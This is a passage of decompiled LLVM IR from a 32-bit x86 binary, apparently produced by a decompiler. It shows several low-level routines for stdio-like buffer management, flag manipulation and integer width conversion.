dec_label_pc_8053cfa:                             ; preds = %dec_label_pc_8053cc9, %dec_label_pc_8053cf2
  %v4_8053cfa = phi i32 [ %v2_8053cf8, %dec_label_pc_8053cf2 ], [ %v4_8053cfa.pre, %dec_label_pc_8053cc9 ]
  %v5_8053cfa = sub i32 %arg3, %v4_8053cfa
  br label %dec_label_pc_8053cfe

dec_label_pc_8053cfe:                             ; preds = %dec_label_pc_8053cc3, %dec_label_pc_8053c8c, %dec_label_pc_8053cfa
  %stack_var_12.0 = phi i32 [ %v5_8053cfa, %dec_label_pc_8053cfa ], [ 0, %dec_label_pc_8053c8c ], [ %arg3, %dec_label_pc_8053cc3 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8053c8f, i32* @ebx, align 4
  store i32 %v0_8053c8d, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8053cef, { 1, 0 }
  uselistorder i32 %v1_8053cec, { 1, 0 }
  uselistorder i32 %v1_8053ceb, { 0, 2, 1 }
  uselistorder i32 %v0_8053ce1, { 1, 0 }
  uselistorder i32 %v2_8053cc5, { 1, 0 }
  uselistorder i32 %v2_8053cc3, { 1, 2, 0 }
  uselistorder i32 %v5_8053cb7, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @function_80504fc, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8053cfe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053cfa, { 1, 0 }
  uselistorder label %dec_label_pc_8053cdd, { 1, 0 }
}

define i32 @function_8053d0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053d0c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053d0c = load i32, i32* @ebp, align 4
  %v0_8053d0d = load i32, i32* @edi, align 4
  %v0_8053d0e = load i32, i32* @esi, align 4
  %v0_8053d0f = load i32, i32* @ebx, align 4
  store i32 %v0_8053d0f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8053d1f = add i32 %arg3, 1
  %v2_8053d1f = inttoptr i32 %v1_8053d1f to i8*
  %v3_8053d1f = load i8, i8* %v2_8053d1f, align 1
  %v4_8053d1f = and i8 %v3_8053d1f, 2
  %v5_8053d1f = icmp eq i8 %v4_8053d1f, 0
  %v1_8053d23 = icmp eq i1 %v5_8053d1f, false
  br i1 %v1_8053d23, label %dec_label_pc_8053dda, label %dec_label_pc_8053d29

dec_label_pc_8053d29:                             ; preds = %dec_label_pc_8053d0c
  %v1_8053d29 = add i32 %arg3, 4
  %v2_8053d29 = inttoptr i32 %v1_8053d29 to i32*
  %v3_8053d29 = load i32, i32* %v2_8053d29, align 4
  %v13_8053d29 = icmp eq i32 %v3_8053d29, -2
  %v1_8053d2d = add i32 %arg3, 16
  %v2_8053d2d = inttoptr i32 %v1_8053d2d to i32*
  %v3_8053d2d = load i32, i32* %v2_8053d2d, align 4
  store i32 %v3_8053d2d, i32* @edx, align 4
  %v1_8053d30 = add i32 %arg3, 12
  %v2_8053d30 = inttoptr i32 %v1_8053d30 to i32*
  %v3_8053d30 = load i32, i32* %v2_8053d30, align 4
  %v1_8053d33 = icmp eq i1 %v13_8053d29, false
  %v2_8053d53 = sub i32 %v3_8053d30, %v3_8053d2d
  store i32 %v2_8053d53, i32* %eax.global-to-local, align 4
  br i1 %v1_8053d33, label %dec_label_pc_8053d53, label %dec_label_pc_8053d35

dec_label_pc_8053d35:                             ; preds = %dec_label_pc_8053d29
  %tmp22 = icmp ult i32 %v2_8053d53, %arg2
  br i1 %tmp22, label %dec_label_pc_8053d3d, label %dec_label_pc_8053d3f

dec_label_pc_8053d3d:                             ; preds = %dec_label_pc_8053d35
  br label %dec_label_pc_8053d3f

dec_label_pc_8053d3f:                             ; preds = %dec_label_pc_8053d35, %dec_label_pc_8053d3d
  %storemerge = phi i32 [ %v2_8053d53, %dec_label_pc_8053d3d ], [ %arg2, %dec_label_pc_8053d35 ]
  %v0_8053d40 = phi i32 [ %v2_8053d53, %dec_label_pc_8053d3d ], [ %arg2, %dec_label_pc_8053d35 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8053d43 = inttoptr i32 %v3_8053d2d to i16*
  %v4_8053d43 = call i32 @function_8051414(i16* %v3_8053d43, i32 %v0_8053d40, i32 %v2_8053d53)
  store i32 %v4_8053d43, i32* %eax.global-to-local, align 4
  %v0_8053d48 = load i32, i32* @ebx, align 4
  %v1_8053d48 = add i32 %v0_8053d48, 16
  %v2_8053d48 = inttoptr i32 %v1_8053d48 to i32*
  %v3_8053d48 = load i32, i32* %v2_8053d48, align 4
  %v4_8053d48 = load i32, i32* @esi, align 4
  %v5_8053d48 = add i32 %v4_8053d48, %v3_8053d48
  store i32 %v5_8053d48, i32* %v2_8053d48, align 4
  br label %dec_label_pc_8053df2

dec_label_pc_8053d53:                             ; preds = %dec_label_pc_8053d29
  %v6_8053d57 = icmp ult i32 %v2_8053d53, %arg2
  br i1 %v6_8053d57, label %dec_label_pc_8053dc1, label %dec_label_pc_8053d59

dec_label_pc_8053d59:                             ; preds = %dec_label_pc_8053d53
  %v0_8053d59 = load i32, i32* @ecx, align 4
  %v3_8053d5d = inttoptr i32 %v3_8053d2d to i16*
  %v4_8053d5d = call i32 @function_8051414(i16* %v3_8053d5d, i32 %arg2, i32 %v0_8053d59)
  store i32 %v4_8053d5d, i32* %eax.global-to-local, align 4
  %v0_8053d62 = load i32, i32* @ebx, align 4
  %v1_8053d62 = add i32 %v0_8053d62, 16
  %v2_8053d62 = inttoptr i32 %v1_8053d62 to i32*
  %v3_8053d62 = load i32, i32* %v2_8053d62, align 4
  %v4_8053d62 = load i32, i32* @edi, align 4
  %v5_8053d62 = add i32 %v4_8053d62, %v3_8053d62
  store i32 %v5_8053d62, i32* %v2_8053d62, align 4
  %v0_8053d68 = load i32, i32* @ebx, align 4
  %v1_8053d68 = add i32 %v0_8053d68, 1
  %v2_8053d68 = inttoptr i32 %v1_8053d68 to i8*
  %v3_8053d68 = load i8, i8* %v2_8053d68, align 1
  %v4_8053d68 = urem i8 %v3_8053d68, 2
  %v5_8053d68 = icmp eq i8 %v4_8053d68, 0
  br i1 %v5_8053d68, label %dec_label_pc_8053df2, label %dec_label_pc_8053d72

dec_label_pc_8053d72:                             ; preds = %dec_label_pc_8053d59
  %v0_8053d72 = load i32, i32* @edx, align 4
  %v0_8053d73 = load i32, i32* @edi, align 4
  %v4_8053d77 = call i32 @function_80546c4(i8 10, i32 %v0_8053d73, i32 %v0_8053d72)
  store i32 %v4_8053d77, i32* %eax.global-to-local, align 4
  %v1_8053d7f = icmp eq i32 %v4_8053d77, 0
  br i1 %v1_8053d7f, label %dec_label_pc_8053df2, label %dec_label_pc_8053d83

dec_label_pc_8053d83:                             ; preds = %dec_label_pc_8053d72
  %v0_8053d86 = load i32, i32* @ebx, align 4
  %v1_8053d87 = call i32 @function_8050744(i32 %v0_8053d86)
  store i32 %v1_8053d87, i32* %eax.global-to-local, align 4
  %v1_8053d8f = icmp eq i32 %v1_8053d87, 0
  br i1 %v1_8053d8f, label %dec_label_pc_8053df2, label %dec_label_pc_8053d93

dec_label_pc_8053d93:                             ; preds = %dec_label_pc_8053d83
  %v0_8053d93 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8053d93, %v1_8053d87
  br i1 %tmp23, label %dec_label_pc_8053d99, label %dec_label_pc_8053d9b

dec_label_pc_8053d99:                             ; preds = %dec_label_pc_8053d93
  br label %dec_label_pc_8053d9b

dec_label_pc_8053d9b:                             ; preds = %dec_label_pc_8053d93, %dec_label_pc_8053d99
  %storemerge24 = phi i32 [ %v1_8053d87, %dec_label_pc_8053d99 ], [ %v0_8053d93, %dec_label_pc_8053d93 ]
  %v0_8053da2 = phi i32 [ %v1_8053d87, %dec_label_pc_8053d99 ], [ %v0_8053d93, %dec_label_pc_8053d93 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_8053d9d = sub i32 %v0_8053d93, %v0_8053da2
  store i32 %v2_8053d9d, i32* %eax.global-to-local, align 4
  %v0_8053d9f = load i32, i32* @ebp, align 4
  %v2_8053d9f = add i32 %v0_8053d9f, %v2_8053d9d
  store i32 %v2_8053d9f, i32* %ebp.global-to-local, align 4
  %v4_8053da6 = call i32 @function_8054654(i8* inttoptr (i32 10 to i8*), i32 %v0_8053da2, i32 %v2_8053d9d)
  store i32 %v4_8053da6, i32* %eax.global-to-local, align 4
  store i32 %v4_8053da6, i32* @edx, align 4
  %v1_8053db0 = icmp eq i32 %v4_8053da6, 0
  br i1 %v1_8053db0, label %dec_label_pc_8053df2, label %dec_label_pc_8053db4

dec_label_pc_8053db4:                             ; preds = %dec_label_pc_8053d9b
  %v0_8053db4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053db4 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053db4 = sub i32 %v0_8053db4, %v4_8053da6
  %v2_8053db8 = add i32 %v2_8053db4, %v1_8053db4
  store i32 %v2_8053db8, i32* %eax.global-to-local, align 4
  %v0_8053dba = load i32, i32* @ebx, align 4
  %v1_8053dba = add i32 %v0_8053dba, 16
  %v2_8053dba = inttoptr i32 %v1_8053dba to i32*
  %v3_8053dba = load i32, i32* %v2_8053dba, align 4
  %v5_8053dba = sub i32 %v3_8053dba, %v2_8053db8
  store i32 %v5_8053dba, i32* %v2_8053dba, align 4
  %v0_8053dbd = load i32, i32* @edi, align 4
  %v1_8053dbd = load i32, i32* %eax.global-to-local, align 4
  %v2_8053dbd = sub i32 %v0_8053dbd, %v1_8053dbd
  store i32 %v2_8053dbd, i32* @edi, align 4
  br label %dec_label_pc_8053df2

dec_label_pc_8053dc1:                             ; preds = %dec_label_pc_8053d53
  %v2_8053dc1 = add i32 %arg3, 8
  %v3_8053dc1 = inttoptr i32 %v2_8053dc1 to i32*
  %v4_8053dc1 = load i32, i32* %v3_8053dc1, align 4
  %v15_8053dc1 = icmp eq i32 %v3_8053d2d, %v4_8053dc1
  br i1 %v15_8053dc1, label %dec_label_pc_8053dda, label %dec_label_pc_8053dc6

dec_label_pc_8053dc6:                             ; preds = %dec_label_pc_8053dc1
  %v1_8053dca = call i32 @function_8050744(i32 %arg3)
  store i32 %v1_8053dca, i32* %eax.global-to-local, align 4
  %v1_8053dd2 = icmp eq i32 %v1_8053dca, 0
  br i1 %v1_8053dd2, label %dec_label_pc_8053dc6.dec_label_pc_8053dda_crit_edge, label %dec_label_pc_8053dd6

dec_label_pc_8053dc6.dec_label_pc_8053dda_crit_edge: ; preds = %dec_label_pc_8053dc6
  %v0_8053dda.pre = load i32, i32* @edi, align 4
  %v0_8053de2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053dda

dec_label_pc_8053dd6:                             ; preds = %dec_label_pc_8053dc6
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8053df2

dec_label_pc_8053dda:                             ; preds = %dec_label_pc_8053dc6.dec_label_pc_8053dda_crit_edge, %dec_label_pc_8053dc1, %dec_label_pc_8053d0c
  %v0_8053de2 = phi i32 [ %v0_8053de2.pre, %dec_label_pc_8053dc6.dec_label_pc_8053dda_crit_edge ], [ %arg3, %dec_label_pc_8053dc1 ], [ %arg3, %dec_label_pc_8053d0c ]
  %v0_8053dda = phi i32 [ %v0_8053dda.pre, %dec_label_pc_8053dc6.dec_label_pc_8053dda_crit_edge ], [ %arg2, %dec_label_pc_8053dc1 ], [ %arg2, %dec_label_pc_8053d0c ]
  store i32 %v0_8053d0f, i32* @ebx, align 4
  store i32 %v0_8053d0d, i32* @edi, align 4
  %v4_8053ded = inttoptr i32 %v0_8053de2 to i16*
  %v5_8053ded = call i32 @function_8053c8c(i16* %v4_8053ded, i32 %v0_8053dda, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8053ded, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053df2

dec_label_pc_8053df2:                             ; preds = %dec_label_pc_8053d9b, %dec_label_pc_8053d83, %dec_label_pc_8053d72, %dec_label_pc_8053d59, %dec_label_pc_8053dd6, %dec_label_pc_8053db4, %dec_label_pc_8053d3f, %dec_label_pc_8053dda
  %v0_8053df5 = load i32, i32* @edi, align 4
  store i32 %v0_8053df5, i32* %eax.global-to-local, align 4
  %v2_8053df7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053df7, i32* @ebx, align 4
  store i32 %v0_8053d0e, i32* @esi, align 4
  store i32 %v0_8053d0d, i32* @edi, align 4
  store i32 %v0_8053d0c, i32* @ebp, align 4
  ret i32 %v0_8053df5

; uselistorder directives
  uselistorder i32 %v2_8053db8, { 1, 0 }
  uselistorder i32 %v4_8053da6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8053d9d, { 1, 0, 2 }
  uselistorder i32 %v0_8053d93, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8053d53, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_8053d0d, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8053df2, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_8053d9b, { 1, 0 }
  uselistorder label %dec_label_pc_8053d3f, { 1, 0 }
}

define i32 @function_8053dfc(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053dfc:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053dfc = load i32, i32* @ebx, align 4
  %v4_8053e00 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053e00, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8053e08 = bitcast i16* %arg1 to i32*
  %v2_8053e08 = load i32, i32* %v1_8053e08, align 4
  store i32 %v2_8053e08, i32* %eax.global-to-local, align 4
  %v1_8053e0a = urem i32 %v2_8053e08, 65536
  store i32 %v1_8053e0a, i32* %edx.global-to-local, align 4
  %v2_8053e0d = and i32 %v1_8053e0a, %arg2
  %v3_8053e0d = icmp eq i32 %v2_8053e0d, 0
  %v1_8053e0f = icmp eq i1 %v3_8053e0d, false
  br i1 %v1_8053e0f, label %dec_label_pc_8053e1e, label %dec_label_pc_8053e11

dec_label_pc_8053e11:                             ; preds = %dec_label_pc_8053dfc
  %v1_8053e11 = and i32 %v2_8053e08, 2176
  %v2_8053e11 = icmp eq i32 %v1_8053e11, 0
  store i32 %v1_8053e11, i32* %edx.global-to-local, align 4
  %v1_8053e17 = icmp eq i1 %v2_8053e11, false
  br i1 %v1_8053e17, label %dec_label_pc_8053e26, label %dec_label_pc_8053e19

dec_label_pc_8053e19:                             ; preds = %dec_label_pc_8053e11
  %v2_8053e19 = or i32 %v2_8053e08, %arg2
  store i32 %v2_8053e19, i32* %eax.global-to-local, align 4
  %v1_8053e1b = trunc i32 %v2_8053e19 to i16
  store i16 %v1_8053e1b, i16* %arg1, align 2
  %v0_8053e1e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053e1e

dec_label_pc_8053e1e:                             ; preds = %dec_label_pc_8053dfc, %dec_label_pc_8053e19
  %v0_8053e63 = phi i32 [ %v4_8053e00, %dec_label_pc_8053dfc ], [ %v0_8053e1e.pre, %dec_label_pc_8053e19 ]
  %v1_8053e1e = inttoptr i32 %v0_8053e63 to i16*
  %v2_8053e1e = load i16, i16* %v1_8053e1e, align 2
  %v3_8053e1e = zext i16 %v2_8053e1e to i32
  store i32 %v3_8053e1e, i32* %edx.global-to-local, align 4
  %v2_8053e21 = and i16 %v2_8053e1e, 32
  %v3_8053e21 = icmp eq i16 %v2_8053e21, 0
  br i1 %v3_8053e21, label %dec_label_pc_8053e3a, label %dec_label_pc_8053e26

dec_label_pc_8053e26:                             ; preds = %dec_label_pc_8053e1e, %dec_label_pc_8053e11
  %v1_8053e26 = call i32 @function_8050568(i32 %v0_8053dfc)
  store i32 %v1_8053e26, i32* %eax.global-to-local, align 4
  %v1_8053e2b = inttoptr i32 %v1_8053e26 to i32*
  store i32 9, i32* %v1_8053e2b, align 4
  br label %dec_label_pc_8053e31

dec_label_pc_8053e31:                             ; preds = %dec_label_pc_8053e51, %dec_label_pc_8053e26
  %v0_8053e31 = load i32, i32* @ebx, align 4
  %v1_8053e31 = inttoptr i32 %v0_8053e31 to i16*
  %v2_8053e31 = load i16, i16* %v1_8053e31, align 2
  %v3_8053e31 = or i16 %v2_8053e31, 8
  store i16 %v3_8053e31, i16* %v1_8053e31, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053e94

dec_label_pc_8053e3a:                             ; preds = %dec_label_pc_8053e1e
  %v2_8053e3a = urem i16 %v2_8053e1e, 4
  %v3_8053e3a = icmp eq i16 %v2_8053e3a, 0
  br i1 %v3_8053e3a, label %dec_label_pc_8053e80, label %dec_label_pc_8053e3f

dec_label_pc_8053e3f:                             ; preds = %dec_label_pc_8053e3a
  %v2_8053e3f = and i32 %v3_8053e1e, 4
  %v3_8053e3f = icmp eq i32 %v2_8053e3f, 0
  %v1_8053e42 = icmp eq i1 %v3_8053e3f, false
  br i1 %v1_8053e42, label %dec_label_pc_8053e70, label %dec_label_pc_8053e44

dec_label_pc_8053e44:                             ; preds = %dec_label_pc_8053e3f
  %v1_8053e44 = add i32 %v0_8053e63, 20
  %v2_8053e44 = inttoptr i32 %v1_8053e44 to i32*
  %v3_8053e44 = load i32, i32* %v2_8053e44, align 4
  store i32 %v3_8053e44, i32* %eax.global-to-local, align 4
  %v2_8053e47 = add i32 %v0_8053e63, 16
  %v3_8053e47 = inttoptr i32 %v2_8053e47 to i32*
  %v4_8053e47 = load i32, i32* %v3_8053e47, align 4
  %v15_8053e47 = icmp eq i32 %v3_8053e44, %v4_8053e47
  %v1_8053e4a = icmp eq i1 %v15_8053e47, false
  br i1 %v1_8053e4a, label %dec_label_pc_8053e51, label %dec_label_pc_8053e4c

dec_label_pc_8053e4c:                             ; preds = %dec_label_pc_8053e44
  %v2_8053e4c = and i32 %v3_8053e1e, 2
  %v3_8053e4c = icmp eq i32 %v2_8053e4c, 0
  br i1 %v3_8053e4c, label %dec_label_pc_8053e70, label %dec_label_pc_8053e51

dec_label_pc_8053e51:                             ; preds = %dec_label_pc_8053e4c, %dec_label_pc_8053e44
  %v1_8053e51 = and i32 %v3_8053e1e, 1024
  store i32 %v1_8053e51, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_8053e51, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_8053e64 = call i32 @function_8055410(i32 %v0_8053e63, i32 0, i32 %tmp18, i32 %v1_8053e51)
  store i32 %v5_8053e64, i32* %eax.global-to-local, align 4
  %v1_8053e6c = icmp eq i32 %v5_8053e64, 0
  %v1_8053e6e = icmp eq i1 %v1_8053e6c, false
  br i1 %v1_8053e6e, label %dec_label_pc_8053e31, label %dec_label_pc_8053e51.dec_label_pc_8053e70_crit_edge

dec_label_pc_8053e51.dec_label_pc_8053e70_crit_edge: ; preds = %dec_label_pc_8053e51
  %v0_8053e70.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053e70

dec_label_pc_8053e70:                             ; preds = %dec_label_pc_8053e51.dec_label_pc_8053e70_crit_edge, %dec_label_pc_8053e4c, %dec_label_pc_8053e3f
  %v10_8053e70 = phi i32 [ %v0_8053e70.pre, %dec_label_pc_8053e51.dec_label_pc_8053e70_crit_edge ], [ %v0_8053e63, %dec_label_pc_8053e4c ], [ %v0_8053e63, %dec_label_pc_8053e3f ]
  %v1_8053e70 = inttoptr i32 %v10_8053e70 to i16*
  %v2_8053e70 = load i16, i16* %v1_8053e70, align 2
  %v3_8053e70 = and i16 %v2_8053e70, -4
  store i16 %v3_8053e70, i16* %v1_8053e70, align 2
  %v0_8053e74 = load i32, i32* @ebx, align 4
  %v1_8053e74 = add i32 %v0_8053e74, 8
  %v2_8053e74 = inttoptr i32 %v1_8053e74 to i32*
  %v3_8053e74 = load i32, i32* %v2_8053e74, align 4
  store i32 %v3_8053e74, i32* %eax.global-to-local, align 4
  %v2_8053e77 = add i32 %v0_8053e74, 24
  %v3_8053e77 = inttoptr i32 %v2_8053e77 to i32*
  store i32 %v3_8053e74, i32* %v3_8053e77, align 4
  %v0_8053e7a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e7a = load i32, i32* @ebx, align 4
  %v2_8053e7a = add i32 %v1_8053e7a, 16
  %v3_8053e7a = inttoptr i32 %v2_8053e7a to i32*
  store i32 %v0_8053e7a, i32* %v3_8053e7a, align 4
  %v0_8053e7d = load i32, i32* %eax.global-to-local, align 4
  %v1_8053e7d = load i32, i32* @ebx, align 4
  %v2_8053e7d = add i32 %v1_8053e7d, 20
  %v3_8053e7d = inttoptr i32 %v2_8053e7d to i32*
  store i32 %v0_8053e7d, i32* %v3_8053e7d, align 4
  %v0_8053e80.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053e80

dec_label_pc_8053e80:                             ; preds = %dec_label_pc_8053e3a, %dec_label_pc_8053e70
  %v9_8053e80 = phi i32 [ %v0_8053e63, %dec_label_pc_8053e3a ], [ %v0_8053e80.pre, %dec_label_pc_8053e70 ]
  %v1_8053e80 = inttoptr i32 %v9_8053e80 to i16*
  %v2_8053e80 = load i16, i16* %v1_8053e80, align 2
  %v3_8053e80 = or i16 %v2_8053e80, 64
  store i16 %v3_8053e80, i16* %v1_8053e80, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8053e86 = load i32, i32* @ebx, align 4
  %v1_8053e86 = inttoptr i32 %v0_8053e86 to i16*
  %v2_8053e86 = load i16, i16* %v1_8053e86, align 2
  %v3_8053e86 = zext i16 %v2_8053e86 to i32
  store i32 %v3_8053e86, i32* %eax.global-to-local, align 4
  %v3_8053e89 = and i16 %v2_8053e86, 2816
  %v4_8053e89 = icmp eq i16 %v3_8053e89, 0
  %v1_8053e8c = icmp eq i1 %v4_8053e89, false
  br i1 %v1_8053e8c, label %dec_label_pc_8053e94, label %dec_label_pc_8053e8e

dec_label_pc_8053e8e:                             ; preds = %dec_label_pc_8053e80
  %v1_8053e8e = add i32 %v0_8053e86, 12
  %v2_8053e8e = inttoptr i32 %v1_8053e8e to i32*
  %v3_8053e8e = load i32, i32* %v2_8053e8e, align 4
  store i32 %v3_8053e8e, i32* %eax.global-to-local, align 4
  %v2_8053e91 = add i32 %v0_8053e86, 28
  %v3_8053e91 = inttoptr i32 %v2_8053e91 to i32*
  store i32 %v3_8053e8e, i32* %v3_8053e91, align 4
  %v0_8053e94.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053e94

dec_label_pc_8053e94:                             ; preds = %dec_label_pc_8053e80, %dec_label_pc_8053e31, %dec_label_pc_8053e8e
  %v0_8053e94 = phi i32 [ 0, %dec_label_pc_8053e80 ], [ -1, %dec_label_pc_8053e31 ], [ %v0_8053e94.pre, %dec_label_pc_8053e8e ]
  store i32 %v0_8053e94, i32* %eax.global-to-local, align 4
  %v2_8053e96 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053e96, i32* @edx, align 4
  store i32 %v0_8053dfc, i32* @ebx, align 4
  ret i32 %v0_8053e94

; uselistorder directives
  uselistorder i32 %v0_8053e94, { 1, 0 }
  uselistorder i32 %v0_8053e86, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_8053e51, { 1, 0, 2 }
  uselistorder i32 %v0_8053e63, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8053e0a, { 1, 0 }
  uselistorder i32 %v2_8053e08, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8053dfc, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053e94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053e80, { 1, 0 }
  uselistorder label %dec_label_pc_8053e1e, { 1, 0 }
}

define i32 @function_8053e9c() local_unnamed_addr {
dec_label_pc_8053e9c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_8053ea4 = icmp slt i32 %tmp, 0
  %v3_8053ecd = and i32 %tmp4, 2048
  %v4_8053ecd = icmp eq i32 %v3_8053ecd, 0
  br i1 %v5_8053ea4, label %dec_label_pc_8053ecd, label %dec_label_pc_8053eab

dec_label_pc_8053eab:                             ; preds = %dec_label_pc_8053e9c
  %v1_8053eae = icmp eq i1 %v4_8053ecd, false
  br i1 %v1_8053eae, label %dec_label_pc_8053ed2, label %dec_label_pc_8053eb0

dec_label_pc_8053eb0:                             ; preds = %dec_label_pc_8053eab
  %v1_8053eb0 = inttoptr i32 %tmp3 to i32*
  %v2_8053eb0 = load i32, i32* %v1_8053eb0, align 4
  %v6_8053eb2 = icmp eq i32 %tmp4, 256
  %v1_8053eb8 = icmp eq i1 %v6_8053eb2, false
  br i1 %v1_8053eb8, label %dec_label_pc_8053ebf, label %dec_label_pc_8053eba

dec_label_pc_8053eba:                             ; preds = %dec_label_pc_8053eb0
  %v1_8053eba = urem i32 %v2_8053eb0, 256
  br label %dec_label_pc_8053eca

dec_label_pc_8053ebf:                             ; preds = %dec_label_pc_8053eb0
  %v6_8053ebf = icmp eq i32 %tmp4, 512
  %v1_8053ec5 = icmp eq i1 %v6_8053ebf, false
  br i1 %v1_8053ec5, label %dec_label_pc_8053eca, label %dec_label_pc_8053ec7

dec_label_pc_8053ec7:                             ; preds = %dec_label_pc_8053ebf
  %v1_8053ec7 = urem i32 %v2_8053eb0, 65536
  br label %dec_label_pc_8053eca

dec_label_pc_8053eca:                             ; preds = %dec_label_pc_8053ebf, %dec_label_pc_8053eba, %dec_label_pc_8053ec7
  %v0_8053ecc = phi i32 [ %v2_8053eb0, %dec_label_pc_8053ebf ], [ %v1_8053eba, %dec_label_pc_8053eba ], [ %v1_8053ec7, %dec_label_pc_8053ec7 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8053ecc

dec_label_pc_8053ecd:                             ; preds = %dec_label_pc_8053e9c
  br i1 %v4_8053ecd, label %dec_label_pc_8053ed8, label %dec_label_pc_8053ed2

dec_label_pc_8053ed2:                             ; preds = %dec_label_pc_8053ecd, %dec_label_pc_8053eab
  %v1_8053ed2 = add i32 %tmp3, 4
  %v2_8053ed2 = inttoptr i32 %v1_8053ed2 to i32*
  %v3_8053ed2 = load i32, i32* %v2_8053ed2, align 4
  store i32 %v3_8053ed2, i32* @edx, align 4
  %v1_8053ed5 = inttoptr i32 %tmp3 to i32*
  %v2_8053ed5 = load i32, i32* %v1_8053ed5, align 4
  ret i32 %v2_8053ed5

dec_label_pc_8053ed8:                             ; preds = %dec_label_pc_8053ecd
  %v1_8053ed8 = inttoptr i32 %tmp3 to i32*
  %v2_8053ed8 = load i32, i32* %v1_8053ed8, align 4
  %v6_8053eda = icmp eq i32 %tmp4, 256
  %v1_8053ee0 = icmp eq i1 %v6_8053eda, false
  br i1 %v1_8053ee0, label %dec_label_pc_8053ee7, label %dec_label_pc_8053ee2

dec_label_pc_8053ee2:                             ; preds = %dec_label_pc_8053ed8
  %v1_8053ee2 = mul i32 %v2_8053ed8, 16777216
  %v2_8053ee2 = sdiv i32 %v1_8053ee2, 16777216
  br label %dec_label_pc_8053ef0

dec_label_pc_8053ee7:                             ; preds = %dec_label_pc_8053ed8
  %v6_8053ee7 = icmp eq i32 %tmp4, 512
  %v1_8053eed = icmp eq i1 %v6_8053ee7, false
  br i1 %v1_8053eed, label %dec_label_pc_8053ef0, label %dec_label_pc_8053eef

dec_label_pc_8053eef:                             ; preds = %dec_label_pc_8053ee7
  %v1_8053eef = mul i32 %v2_8053ed8, 65536
  %v2_8053eef = sdiv i32 %v1_8053eef, 65536
  br label %dec_label_pc_8053ef0

dec_label_pc_8053ef0:                             ; preds = %dec_label_pc_8053ee7, %dec_label_pc_8053ee2, %dec_label_pc_8053eef
  %v0_8053ef0 = phi i32 [ %v2_8053ed8, %dec_label_pc_8053ee7 ], [ %v2_8053ee2, %dec_label_pc_8053ee2 ], [ %v2_8053eef, %dec_label_pc_8053eef ]
  %v1_8053ef0 = ashr i32 %v0_8053ef0, 31
  store i32 %v1_8053ef0, i32* @edx, align 4
  ret i32 %v0_8053ef0

; uselistorder directives
  uselistorder i32 %v0_8053ef0, { 1, 0 }
  uselistorder i32 %v2_8053ed8, { 2, 0, 1 }
  uselistorder i32 %v2_8053eb0, { 2, 0, 1 }
  uselistorder i32 %tmp3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8053ef0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053eca, { 2, 0, 1 }
}

